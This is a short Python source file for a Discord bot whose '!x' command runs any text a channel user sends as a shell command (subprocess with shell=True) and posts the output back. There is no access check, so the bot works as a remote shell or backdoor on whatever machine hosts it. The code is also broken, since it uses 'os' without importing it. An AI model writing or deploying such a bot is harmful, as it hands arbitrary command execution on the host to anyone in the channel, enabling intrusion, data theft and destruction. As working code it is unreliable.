import discord
from discord.ext import commands

bot = commands.Bot(command_prefix='!')

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command()
async def x(ctx, *, command):
    import subprocess
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        await ctx.send(f'Command executed successfully:\n```\n{result}\n```')
    except Exception as e:
        await ctx.send(f'An error occurred:\n```\n{e}\n```')

bot.run(os.environ["BOT_TOKEN"])
